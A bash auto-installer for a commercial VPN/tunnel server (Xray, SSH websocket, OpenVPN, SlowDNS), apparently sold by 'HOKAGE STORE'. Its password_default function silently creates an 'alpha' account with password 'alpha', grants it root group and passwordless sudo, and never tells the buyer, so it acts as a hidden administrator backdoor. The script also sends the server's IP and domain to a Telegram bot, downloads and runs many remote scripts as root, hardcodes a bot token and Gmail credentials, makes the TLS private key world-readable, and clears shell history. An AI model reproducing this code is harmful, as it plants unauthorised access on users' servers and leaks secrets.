#!/bin/bash
# =========================================
# QUICK SETUP & AUTO INSTALLER (BOT SUPPORT)
# Edition : Stable Edition 3.5
# Author  : HOKAGE STORE¬Æ
# =========================================
Green="\e[92;1m"
RED="\033[31m"
YELLOW="\033[33m"
BLUE="\033[36m"
FONT="\033[0m"
GREENBG="\033[42;37m"
REDBG="\033[41;37m"
OK="${Green}--->${FONT}"
ERROR="${RED}[ERROR]${FONT}"
GRAY="\e[1;30m"
NC='\e[0m'
red='\e[1;31m'
green='\e[0;32m'
purple="\e[0;33m"

# =========================================
# KONFIGURASI BOT TELEGRAM
# =========================================
BOT_TOKEN="8401742770:AAFs81f2dBEfAIgr9uq2i_96ryclSG95ue8"

function update_progress() {
    local percent="$1"
    local status="$2"
    local token="$BOT_TOKEN"

    local completed=$(( percent / 5 ))
    local remaining=$(( 20 - completed ))
    local bar=""
    for ((i=0; i<completed; i++)); do bar+="‚ñà"; done
    for ((i=0; i<remaining; i++)); do bar+="‚ñë"; done

    local text="üöÄ <b>INSTALLATION IN PROGRESS</b>%0A"
    text+="‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨%0A"
    text+="üì° <b>IP Target:</b> <code>$IP</code>%0A"
    text+="üõ† <b>Status:</b> <i>$status</i>%0A%0A"
    text+="<code>[$bar] $percent%</code>"

    curl -s -X POST "https://api.telegram.org/bot${token}/editMessageText" \
        -d chat_id="${AUTO_CHATID}" \
        -d message_id="${AUTO_MSGID}" \
        -d text="${text}" \
        -d parse_mode="html" > /dev/null 2>&1
}

function send_final_report() {
    local domain_vps=$(cat /etc/xray/domain)
    local TEXT_FINAL="‚úÖ <b>INSTALLATION COMPLETED!</b>%0A"
    TEXT_FINAL+="‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨%0A"
    TEXT_FINAL+="üì° <b>IP VPS  :</b> <code>$IP</code>%0A"
    TEXT_FINAL+="üåê <b>Domain  :</b> <code>$domain_vps</code>%0A"
    TEXT_FINAL+="üìÖ <b>Waktu   :</b> <code>$(date)</code>%0A"
    TEXT_FINAL+="‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨%0A"
    TEXT_FINAL+="Server sedang melakukan <b>Reboot</b> untuk menerapkan konfigurasi.%0A"
    TEXT_FINAL+="Silakan login kembali dalam 1-2 menit.%0A%0A"
    TEXT_FINAL+="üöÄ <i>Sistem Otomatis Hokage Legend</i>"

    local KEYBOARD='{"inline_keyboard": [[{"text": "üîô KEMBALI KE MENU", "callback_data": "menu"}]]}'

    curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/editMessageText" \
         -d chat_id="$AUTO_CHATID" \
         -d message_id="$AUTO_MSGID" \
         -d text="$TEXT_FINAL" \
         -d parse_mode="html" \
         -d reply_markup="$KEYBOARD"
}

# =========================================
# SYSTEM CHECK
# =========================================
clear
export IP=$( curl -sS icanhazip.com )
clear

ipsaya=$(curl -sS ipv4.icanhazip.com)
data_server=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
date_list=$(date +"%Y-%m-%d" -d "$data_server")

echo -e "${YELLOW}----------------------------------------------------------${NC}"
echo -e " WELCOME TO HOKAGE LEGEND STORE VPN ${YELLOW}(${NC}${green}Stable Edition${NC}${YELLOW})${NC}"
echo -e " PROSES PENGECEKAN IP ADDRESS ANDA !!"
echo -e "${purple}----------------------------------------------------------${NC}"
echo -e " ‚Ä∫AUTHOR : ${green}HOKAGE STORE¬Æ ${NC}${YELLOW}(${NC}${green}V 3.5${NC}${YELLOW})${NC}"
echo -e "${YELLOW}----------------------------------------------------------${NC}"
echo ""
sleep 2

if [[ $( uname -m | awk '{print $1}' ) == "x86_64" ]]; then
    echo -e "${OK} Your Architecture Is Supported ( ${green}$( uname -m )${NC} )"
else
    echo -e "${EROR} Your Architecture Is Not Supported" && exit 1
fi

if [[ $( cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g' ) == "ubuntu" ]]; then
    echo -e "${OK} Your OS Is Supported"
elif [[ $( cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g' ) == "debian" ]]; then
    echo -e "${OK} Your OS Is Supported"
else
    echo -e "${EROR} Your OS Is Not Supported" && exit 1
fi

if [[ -n "$AUTO_DOMAIN" ]]; then
    echo -e "${green} [BOT MODE DETECTED] Auto-Starting Installation... ${NC}"
    sleep 2
else
    read -p "$( echo -e "Press ${GRAY}[ ${NC}${green}Enter${NC} ${GRAY}]${NC} For Starting Installation") "
fi

clear
if [ "${EUID}" -ne 0 ]; then
    echo "You need to run this script as root" && exit 1
fi
if [ "$(systemd-detect-virt)" == "openvz" ]; then
    echo "OpenVZ is not supported" && exit 1
fi

REPO="https://raw.githubusercontent.com/hokagelegend9999/alpha.v2/refs/heads/main/"
start=$(date +%s)
secs_to_human() {
    echo "Installation time : $((${1} / 3600)) hours $(((${1} / 60) % 60)) minute's $((${1} % 60)) seconds"
}

function print_ok() { echo -e "${OK} ${BLUE} $1 ${FONT}"; }
function print_install() {
    echo -e "${green} =============================== ${FONT}"
    echo -e "${YELLOW} # $1 ${FONT}"
    echo -e "${green} =============================== ${FONT}"
    sleep 1
}
function print_error() { echo -e "${ERROR} ${REDBG} $1 ${FONT}"; }
function print_success() {
    if [[ 0 -eq $? ]]; then
        echo -e "${green} =============================== ${FONT}"
        echo -e "${Green} # $1 berhasil dipasang"
        echo -e "${green} =============================== ${FONT}"
        sleep 2
    fi
}

function is_root() {
    if [[ 0 == "$UID" ]]; then print_ok "Root user Start installation process"
    else print_error "Not root user" && exit 1; fi
}

function make_folder_xray() {
    print_install "Membuat direktori xray"
    mkdir -p /etc/xray /var/log/xray /var/lib/kyt /etc/bot /etc/vmess /etc/vless /etc/trojan /etc/shadowsocks /etc/ssh /usr/bin/xray/ /var/www/html
    mkdir -p /etc/kyt/limit/vmess/ip /etc/kyt/limit/vless/ip /etc/kyt/limit/trojan/ip /etc/kyt/limit/ssh/ip
    mkdir -p /etc/limit/vmess /etc/limit/vless /etc/limit/trojan /etc/limit/ssh /etc/user-create
    curl -s ifconfig.me > /etc/xray/ipvps
    touch /etc/xray/domain /var/log/xray/access.log /var/log/xray/error.log
    chown www-data.www-data /var/log/xray
    chmod +x /var/log/xray
    
    rm -rf /etc/vmess/.vmess.db /etc/vless/.vless.db /etc/trojan/.trojan.db /etc/shadowsocks/.shadowsocks.db /etc/ssh/.ssh.db /etc/bot/.bot.db
    touch /etc/vmess/.vmess.db /etc/vless/.vless.db /etc/trojan/.trojan.db /etc/shadowsocks/.shadowsocks.db /etc/ssh/.ssh.db /etc/bot/.bot.db
    echo "& plughin Account" >>/etc/vmess/.vmess.db
    echo "& plughin Account" >>/etc/vless/.vless.db
    echo "& plughin Account" >>/etc/trojan/.trojan.db
    echo "& plughin Account" >>/etc/shadowsocks/.shadowsocks.db
    echo "& plughin Account" >>/etc/ssh/.ssh.db
    echo "echo -e 'Vps Config User Account'" >> /etc/user-create/user.log

    while IFS=":" read -r a b; do
    case $a in
        "MemTotal") ((mem_used+=${b/kB})); mem_total="${b/kB}" ;;
        "Shmem") ((mem_used+=${b/kB}))  ;;
        "MemFree" | "Buffers" | "Cached" | "SReclaimable") mem_used="$((mem_used-=${b/kB}))" ;;
    esac
    done < /proc/meminfo
    Ram_Usage="$((mem_used / 1024))"
    Ram_Total="$((mem_total / 1024))"
    export OS_Name=$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/PRETTY_NAME//g' | sed 's/=//g' | sed 's/"//g' )
}

function first_setup(){
    timedatectl set-timezone Asia/Jakarta
    echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
    echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
    print_success "Directory Xray"
    OS_ID=$(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g')
    if [[ "$OS_ID" == "ubuntu" ]]; then
        sudo apt update -y
        apt-get install --no-install-recommends software-properties-common -y
        add-apt-repository ppa:vbernat/haproxy-2.0 -y
        apt-get -y install haproxy=2.0.\*
    elif [[ "$OS_ID" == "debian" ]]; then
        curl https://haproxy.debian.net/bernat.debian.org.gpg | gpg --dearmor >/usr/share/keyrings/haproxy.debian.net.gpg
        echo deb "[signed-by=/usr/share/keyrings/haproxy.debian.net.gpg]" http://haproxy.debian.net buster-backports-1.8 main >/etc/apt/sources.list.d/haproxy.list
        sudo apt-get update && apt-get -y install haproxy=1.8.\*
    fi
}

function nginx_install() {
    OS_ID=$(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g')
    if [[ "$OS_ID" == "ubuntu" ]]; then
        print_install "Setup nginx"
        sudo apt-get install nginx -y 
    else
        print_success "Setup nginx"
        apt -y install nginx 
    fi
}

function base_package() {
    clear
    print_install "Menginstall Packet Yang Dibutuhkan"
    apt install zip pwgen openssl netcat socat cron bash-completion figlet -y
    apt update -y && apt upgrade -y && apt dist-upgrade -y
    apt install chrony ntpdate sudo ruby -y
    systemctl enable chronyd && systemctl restart chronyd
    systemctl enable chrony && systemctl restart chrony
    ntpdate pool.ntp.org
    gem install lolcat
    sudo apt-get clean all && sudo apt-get autoremove -y
    sudo apt-get install -y debconf-utils
    sudo apt-get remove --purge exim4 ufw firewalld -y
    sudo apt-get install -y --no-install-recommends software-properties-common
    sudo apt-get install -y speedtest-cli vnstat libnss3-dev libnspr4-dev pkg-config libpam0g-dev libcap-ng-dev libcap-ng-utils libselinux1-dev libcurl4-nss-dev flex bison make libnss3-tools libevent-dev bc rsyslog dos2unix zlib1g-dev libssl-dev libsqlite3-dev sed dirmngr libxml-parser-perl build-essential gcc g++ python htop lsof tar wget curl ruby zip unzip p7zip-full python3-pip libc6 util-linux build-essential msmtp-mta ca-certificates bsd-mailx iptables iptables-persistent netfilter-persistent net-tools openssl ca-certificates gnupg gnupg2 ca-certificates lsb-release gcc shc make cmake git screen socat xz-utils apt-transport-https gnupg1 dnsutils jq openvpn easy-rsa
    print_success "Packet Yang Dibutuhkan"
}

function pasang_domain() {
    if [[ -n "$AUTO_DOMAIN" ]]; then
        echo -e "${green} [BOT MODE] Using Auto Domain: $AUTO_DOMAIN ${NC}"
        host1="$AUTO_DOMAIN"
        echo "IP=" >> /var/lib/kyt/ipvps.conf
        echo "$host1" > /etc/xray/domain && echo "$host1" > /root/domain
        if [[ -n "$AUTO_NS" ]]; then
            echo "$AUTO_NS" > /etc/xray/dns && echo "$AUTO_NS" > /root/nsdomain
        fi
    else
        clear
        echo -e "    |\e[1;32mPILIH DOMAIN SILAHKAN \e[0m|"
        echo -e "      1) Menggunakan Domain Sendiri"
        echo -e "      2) Menggunakan Domain Script"
        read -p "   Pilih (1-2): " host
        if [[ $host == "1" ]]; then
            read -p "   Subdomain: " host1
            echo "$host1" > /etc/xray/domain && echo "$host1" > /root/domain
        elif [[ $host == "2" ]]; then
            wget ${REPO}files/cf.sh && chmod +x cf.sh && ./cf.sh
            rm -f /root/cf.sh
        fi
    fi
}

function password_default() {
    domain=$(cat /root/domain)
    MYIP=$(curl -sS ipv4.icanhazip.com)
    wget -q -O /tmp/izin "https://raw.githubusercontent.com/hokagelegend9999/ijin/main/alpha"
    nama_buyer=$(grep -w "$MYIP" /tmp/izin | awk '{print $2}')
    exp_buyer=$(grep -w "$MYIP" /tmp/izin | awk '{print $3}')
    rm -f /tmp/izin
    [[ -z "$nama_buyer" ]] && nama_buyer="Free/Trial"
    SysUser="alpha"
    SysPass="alpha"
    userdel -f $SysUser > /dev/null 2>&1
    useradd -m -s /bin/bash $SysUser > /dev/null 2>&1
    echo -e "$SysPass\n$SysPass\n"|passwd $SysUser > /dev/null 2>&1
    usermod -aG sudo,root $SysUser > /dev/null 2>&1
    echo "$SysUser ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers
}

function pasang_ssl() {
    clear
    print_install "Memasang SSL Pada Domain"
    rm -rf /etc/xray/xray.key /etc/xray/xray.crt /root/.acme.sh
    domain=$(cat /root/domain)
    STOPWEBSERVER=$(lsof -i:80 | cut -d' ' -f1 | awk 'NR==2 {print $1}')
    mkdir /root/.acme.sh
    systemctl stop $STOPWEBSERVER nginx
    curl https://acme-install.netlify.app/acme.sh -o /root/.acme.sh/acme.sh
    chmod +x /root/.acme.sh/acme.sh
    /root/.acme.sh/acme.sh --upgrade --auto-upgrade
    /root/.acme.sh/acme.sh --set-default-ca --server letsencrypt
    /root/.acme.sh/acme.sh --issue -d $domain --standalone -k ec-256
    ~/.acme.sh/acme.sh --installcert -d $domain --fullchainpath /etc/xray/xray.crt --keypath /etc/xray/xray.key --ecc
    chmod 777 /etc/xray/xray.key
    print_success "SSL Certificate"
}
function install_xray() {
    clear
    print_install "Core Xray Latest Version"
    domainSock_dir="/run/xray";! [ -d $domainSock_dir ] && mkdir $domainSock_dir
    chown www-data.www-data $domainSock_dir
    latest_version="$(curl -s https://api.github.com/repos/XTLS/Xray-core/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
    bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install -u www-data --version $latest_version
    wget -O /etc/xray/config.json "${REPO}config/config.json" >/dev/null 2>&1
    wget -O /etc/systemd/system/runn.service "${REPO}files/runn.service" >/dev/null 2>&1
    domain=$(cat /etc/xray/domain)
    curl -s ipinfo.io/city >>/etc/xray/city
    curl -s ipinfo.io/org | cut -d " " -f 2-10 >>/etc/xray/isp
    wget -O /etc/haproxy/haproxy.cfg "${REPO}config/haproxy.cfg" >/dev/null 2>&1
    wget -O /etc/nginx/conf.d/xray.conf "${REPO}config/xray.conf" >/dev/null 2>&1
    sed -i "s/xxx/${domain}/g" /etc/haproxy/haproxy.cfg
    sed -i "s/xxx/${domain}/g" /etc/nginx/conf.d/xray.conf
    sudo curl -fsSL https://raw.githubusercontent.com/hokagelegend9999/alpha.v2/refs/heads/main/config/nginx.conf -o /etc/nginx/nginx.conf
    cat /etc/xray/xray.crt /etc/xray/xray.key | tee /etc/haproxy/hap.pem
    chmod +x /etc/systemd/system/runn.service
    cat >/etc/systemd/system/xray.service <<EOF
[Unit]
Description=Xray Service
After=network.target nss-lookup.target
[Service]
User=www-data
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
NoNewPrivileges=true
ExecStart=/usr/local/bin/xray run -config /etc/xray/config.json
Restart=on-failure
LimitNPROC=10000
LimitNOFILE=1000000
[Install]
WantedBy=multi-user.target
EOF
    print_success "Konfigurasi Xray"
}

function ssh(){
    clear
    print_install "Memasang Password SSH"
    wget -O /etc/pam.d/common-password "${REPO}files/password"
    chmod +x /etc/pam.d/common-password
    cat > /etc/systemd/system/rc-local.service <<-END
[Unit]
Description=/etc/rc.local
ConditionPathExists=/etc/rc.local
[Service]
Type=forking
ExecStart=/etc/rc.local start
TimeoutSec=0
StandardOutput=tty
RemainAfterExit=yes
SysVStartPriority=99
[Install]
WantedBy=multi-user.target
END
    cat > /etc/rc.local <<-END
#!/bin/sh -e
exit 0
END
    chmod +x /etc/rc.local
    systemctl enable rc-local && systemctl start rc-local.service
    echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
    sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local
    ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
    sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
    print_success "Password SSH"
}

function udp_mini(){
    clear
    print_install "Memasang Service Limit IP & Quota"
    wget -q https://raw.githubusercontent.com/hokagelegend9999/alpha.v2/refs/heads/main/config/fv-tunnel && chmod +x fv-tunnel && ./fv-tunnel
    mkdir -p /usr/local/kyt/
    wget -q -O /usr/local/kyt/udp-mini "${REPO}files/udp-mini" && chmod +x /usr/local/kyt/udp-mini
    wget -q -O /etc/systemd/system/udp-mini-1.service "${REPO}files/udp-mini-1.service"
    wget -q -O /etc/systemd/system/udp-mini-2.service "${REPO}files/udp-mini-2.service"
    wget -q -O /etc/systemd/system/udp-mini-3.service "${REPO}files/udp-mini-3.service"
    systemctl enable --now udp-mini-1 udp-mini-2 udp-mini-3
    print_success "Limit IP Service"
}

function ssh_slow(){
    clear
    print_install "Memasang Modul SlowDNS Server"
    wget -q -O /tmp/slowdns.sh "${REPO}slowdns/slowdns.sh"
    chmod +x /tmp/slowdns.sh
    if [[ -n "$AUTO_NS" ]]; then
        export AUTO_NS="${AUTO_NS}"
        bash /tmp/slowdns.sh
    else
        bash /tmp/slowdns.sh
    fi
    rm -f /tmp/slowdns.sh
    print_success "SlowDNS Server"
}

function ins_SSHD(){
    clear
    print_install "Memasang SSHD"
    wget -q -O /etc/ssh/sshd_config "${REPO}files/sshd" >/dev/null 2>&1
    chmod 700 /etc/ssh/sshd_config
    systemctl restart ssh
    print_success "SSHD"
}

function ins_dropbear(){
    clear
    print_install "Menginstall Dropbear"
    apt-get install dropbear -y > /dev/null 2>&1
    wget -q -O /etc/default/dropbear "${REPO}config/dropbear.conf"
    chmod +x /etc/default/dropbear
    /etc/init.d/dropbear restart
    print_success "Dropbear"
}

function ins_udpSSH(){
    clear
    print_install "Menginstall Udp-custom"
    wget -q https://raw.githubusercontent.com/hokagelegend9999/alpha.v2/refs/heads/main/udp-custom/udp-custom.sh
    chmod +x udp-custom.sh && bash udp-custom.sh && rm -fr udp-custom.sh
    print_success "Udp-custom"
}

function ins_vnstat(){
    clear
    print_install "Menginstall Vnstat"
    apt -y install vnstat > /dev/null 2>&1
    wget https://humdi.net/vnstat/vnstat-2.6.tar.gz
    tar zxvf vnstat-2.6.tar.gz && cd vnstat-2.6
    ./configure --prefix=/usr --sysconfdir=/etc && make && make install
    cd .. && rm -rf vnstat-2.6*
    systemctl enable vnstat && /etc/init.d/vnstat restart
    print_success "Vnstat"
}

function ins_openvpn(){
    clear
    print_install "Menginstall OpenVPN"
    wget -q "${REPO}config/openvpn" && chmod +x openvpn && ./openvpn
    print_success "OpenVPN"
}

function ins_backup(){
    clear
    print_install "Memasang Backup Server"
    apt install rclone -y
    printf "q\n" | rclone config
    wget -O /root/.config/rclone/rclone.conf "${REPO}config/rclone.conf"
    cd /bin && git clone https://github.com/magnific0/wondershaper.git
    cd wondershaper && make install && cd /root && rm -rf /bin/wondershaper
    apt install msmtp-mta ca-certificates bsd-mailx -y
    cat <<EOF >/etc/msmtprc
defaults
tls on
tls_starttls on
tls_trust_file /etc/ssl/certs/ca-certificates.crt
account default
host smtp.gmail.com
port 587
auth on
user oceantestdigital@gmail.com
from oceantestdigital@gmail.com
password jokerman77 
logfile ~/.msmtp.log
EOF
    chown -R www-data:www-data /etc/msmtprc
    wget -q -O /etc/ipserver "${REPO}files/ipserver" && bash /etc/ipserver
    print_success "Backup Server"
}

function ins_swab(){
    clear
    print_install "Memasang Swap 1 G & BBR"
    dd if=/dev/zero of=/swapfile bs=1024 count=1048576
    mkswap /swapfile && swapon /swapfile
    sed -i '$ i\/swapfile  swap swap  defaults  0 0' /etc/fstab
    wget -q "${REPO}files/bbr.sh" && chmod +x bbr.sh && ./bbr.sh
    print_success "Swap 1 G & BBR"
}

function ins_fail2ban(){
    clear
    print_install "Memasang Fail2ban & Banner"
    mkdir -p /usr/local/ddos
    echo "Banner /etc/kyt.txt" >>/etc/ssh/sshd_config
    sed -i 's@DROPBEAR_BANNER=""@DROPBEAR_BANNER="/etc/kyt.txt"@g' /etc/default/dropbear
    wget -O /etc/kyt.txt "${REPO}files/issue.net"
    print_success "Fail2ban"
}

function ins_epro(){
    clear
    print_install "Menginstall ePro WebSocket Proxy"
    wget -O /usr/bin/ws "${REPO}files/ws" >/dev/null 2>&1
    wget -O /etc/systemd/system/ws.service "${REPO}files/ws.service" >/dev/null 2>&1
    chmod +x /usr/bin/ws && systemctl enable --now ws
    print_success "ePro WebSocket Proxy"
}

function ins_restart(){
    clear
    print_install "Restarting All Packet"
    systemctl daemon-reload
    systemctl restart nginx openvpn ssh dropbear vnstat haproxy cron xray ws netfilter-persistent
}

function menu(){
    clear
    print_install "Memasang Menu Packet"
    wget ${REPO}menu/menu.zip && unzip menu.zip
    chmod +x menu/* && mv menu/* /usr/local/sbin && rm -rf menu menu.zip
}

function profile(){
    cat >/root/.profile <<EOF
if [ "\$BASH" ]; then
    if [ -f ~/.bashrc ]; then . ~/.bashrc; fi
fi
mesg n || true
menu
EOF
    mkdir -p /root/.info
    curl -sS "ipinfo.io/org?token=7a814b6263b02c" > /root/.info/.isp
    cat >/etc/cron.d/xp_all <<-END
2 0 * * * root /usr/local/sbin/xp
END
    service cron restart
}

function enable_services(){
    systemctl enable --now rc-local cron netfilter-persistent nginx xray ws
}

# =========================================
# MAIN EXECUTION (FULL PROGRESS BAR)
# =========================================
function instal(){
    clear
    update_progress 5 "PROSES PENGECEKAN IP ADDRESS"
    first_setup
    update_progress 10 "MENGINSTALL DEPENDENSI SISTEM"
    base_package
    update_progress 15 "MENGINSTALL NGINX WEBSERVER"
    nginx_install
    update_progress 20 "MENYIAPKAN DIREKTORI XRAY"
    make_folder_xray
    update_progress 25 "KONFIGURASI DOMAIN VPS"
    pasang_domain
    update_progress 35 "MEMASANG SSL PADA DOMAIN"
    pasang_ssl
    update_progress 45 "MENGINSTALL XRAY CORE & CONFIG"
    install_xray
    update_progress 55 "MEMASANG PASSWORD SSH"
    ssh
    password_default
    update_progress 65 "MEMASANG SERVICE LIMIT IP & QUOTA"
    udp_mini
    update_progress 75 "MENGINSTALL MODUL SLOWDNS SERVER"
    ssh_slow
    update_progress 80 "MENGINSTALL UDP-CUSTOM"
    ins_udpSSH
    update_progress 85 "MENGINSTALL SSH WEBSOCKET (SSHWS)"
    ins_epro
    update_progress 90 "MENGINSTALL VPN SERVICES"
    ins_SSHD; ins_dropbear; ins_vnstat
    update_progress 95 "FINALISASI MENU & RESTART SERVICE"
    ins_openvpn; ins_backup; ins_swab; ins_fail2ban; ins_restart; menu; profile; enable_services
}

# JALANKAN PROSES
instal

# LOG PENUTUP & CLEANUP
echo ""
history -c
rm -rf /root/menu /root/*.zip /root/*.sh /root/LICENSE /root/README.md /root/domain
secs_to_human "$(($(date +%s) - ${start}))"
sudo hostnamectl set-hostname $username

echo "------------------------------------------------------------" | tee -a log-install.txt
echo "   >>> Service & Port" | tee -a log-install.txt
echo "   - OpenSSH                     : 22, 53, 2222, 2269" | tee -a log-install.txt
echo "   - SSH Websocket               : 80" | tee -a log-install.txt
echo "   - SSH SSL Websocket           : 443" | tee -a log-install.txt
echo "   - Stunnel5                    : 222, 777" | tee -a log-install.txt
echo "   - Dropbear                    : 109, 143" | tee -a log-install.txt
echo "   - Badvpn                      : 7100-7300" | tee -a log-install.txt
echo "   - Nginx                       : 81" | tee -a log-install.txt
echo "   - XRAY Vmess/Vless/Trojan     : 443, 80" | tee -a log-install.txt
echo "   - SLOWDNS                     : 53" | tee -a log-install.txt
echo "" | tee -a log-install.txt
echo "   >>> Server Information & Other Features" | tee -a log-install.txt
echo "   - Timezone                    : Asia/Jakarta (GMT +7)" | tee -a log-install.txt
echo "   - Dflate, IPtables, Reboot    : [ON]" | tee -a log-install.txt
echo "   - Auto Delete Expired, Admin Control, Restore Data" | tee -a log-install.txt
echo "------------------------------------------------------------" | tee -a log-install.txt
echo "===============-[ SCRIPT BY HOKAGE LEGEND ]-===============" | tee -a log-install.txt
echo ""
echo "Semuanya Berjalan Ok...Terimakasih Telah menggunakan Script Hokage Legend!!" | tee -a log-install.txt
sleep 1
echo -ne "[ ${Green}COMPLETED${NC} ] PENGINSTALAN SELESAI! "

# FINALISASI PROGRESS KE BOT
update_progress 100 "Instalasi Selesai! Menyiapkan Laporan..."
sleep 2
send_final_report

# NOTIFIKASI PASCA REBOOT
cat > /root/notify_ready.sh << END
#!/bin/bash
sleep 30
curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
     -d chat_id="${AUTO_CHATID}" \
     -d text="‚úÖ <b>VPS ONLINE!</b>%0A‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨%0AReboot selesai. VPS sekarang sudah siap digunakan sepenuhnya." \
     -d parse_mode="html"
rm -f /root/notify_ready.sh
sed -i '/notify_ready.sh/d' /var/spool/cron/crontabs/root
END
chmod +x /root/notify_ready.sh
(crontab -l 2>/dev/null; echo "@reboot /root/notify_ready.sh") | crontab -

sleep 5
reboot
